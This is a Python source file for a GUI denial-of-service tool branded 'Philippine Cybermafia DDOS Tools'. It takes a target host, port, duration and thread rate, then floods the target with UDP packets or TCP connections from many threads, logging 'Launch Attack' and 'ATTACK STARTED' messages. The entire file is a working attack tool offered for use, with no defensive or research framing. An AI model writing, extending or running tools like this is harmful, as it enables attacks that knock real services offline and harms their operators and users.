#dev by pcm@clay

import tkinter as tk
from tkinter import ttk
import threading
import socket
import time

def send_packet_once(target, port, protocol, log_widget):
    try:
        if protocol == 'UDP':
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(b'FLOOD', (target, port))
            sock.close()
        else:  # TCP
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            sock.send(b'FLOOD')
            sock.close()
        log_widget.insert(tk.END, f"{protocol} PACKET -> {target}:{port}\n")
        log_widget.see(tk.END)
    except Exception as e:
        log_widget.insert(tk.END, f"[ERROR] {e}\n")
        log_widget.see(tk.END)

def socket_flood(target, port, seconds, tps, protocol, log_widget):
    log_widget.insert(tk.END, f"\n[ATTACK STARTED] {protocol} | Target: {target}:{port} | Duration: {seconds}s | Threads/sec: {tps}\n")
    log_widget.see(tk.END)
    end_time = time.time() + seconds

    while time.time() < end_time:
        for _ in range(tps):
            threading.Thread(target=send_packet_once, args=(target, port, protocol, log_widget), daemon=True).start()
        time.sleep(1)

    log_widget.insert(tk.END, "[DONE] Attack finished.\n\n")
    log_widget.see(tk.END)

def launch_attack():
    target = target_entry.get()
    try:
        port = int(port_entry.get())
        seconds = int(duration_entry.get())
        tps = int(tps_entry.get())
        protocol = attack_type.get()

        if not target or port <= 0 or seconds <= 0 or tps <= 0:
            raise ValueError

        threading.Thread(
            target=socket_flood,
            args=(target, port, seconds, tps, protocol, log_text),
            daemon=True
        ).start()

    except ValueError:
        log_text.insert(tk.END, "[ERROR] Enter valid target, port, seconds, and TPS.\n")
        log_text.see(tk.END)

# === GUI Setup ===
root = tk.Tk()
root.title("Philippine cybermafia")
root.geometry("650x550")
root.resizable(False, False)

tk.Label(root, text="🔥 PHILIPPINE CYBERMAFIA DDOS TOOLS", font=("Courier", 18, "bold")).pack(pady=10)

frame = tk.Frame(root)
frame.pack()

tk.Label(frame, text="Target IP/Domain:").grid(row=0, column=0, sticky="e")
target_entry = tk.Entry(frame, width=30)
target_entry.grid(row=0, column=1)

tk.Label(frame, text="Port:").grid(row=1, column=0, sticky="e")
port_entry = tk.Entry(frame, width=10)
port_entry.grid(row=1, column=1, sticky="w")

tk.Label(frame, text="Duration (seconds):").grid(row=2, column=0, sticky="e")
duration_entry = tk.Entry(frame, width=10)
duration_entry.grid(row=2, column=1, sticky="w")

tk.Label(frame, text="Protocol:").grid(row=3, column=0, sticky="e")
attack_type = ttk.Combobox(frame, values=["UDP", "TCP"], state="readonly")
attack_type.set("UDP")
attack_type.grid(row=3, column=1, sticky="w")

tk.Label(frame, text="Threads/sec (TPS):").grid(row=4, column=0, sticky="e")
tps_entry = tk.Entry(frame, width=10)
tps_entry.insert(0, "10")  # default
tps_entry.grid(row=4, column=1, sticky="w")

start_btn = tk.Button(root, text="🚀 Launch Attack", command=launch_attack, bg="#dc3545", fg="white")
start_btn.pack(pady=10)

log_text = tk.Text(root, width=80, height=18, bg="black", fg="lime", font=("Courier", 9))
log_text.pack(padx=10, pady=10)

root.mainloop()
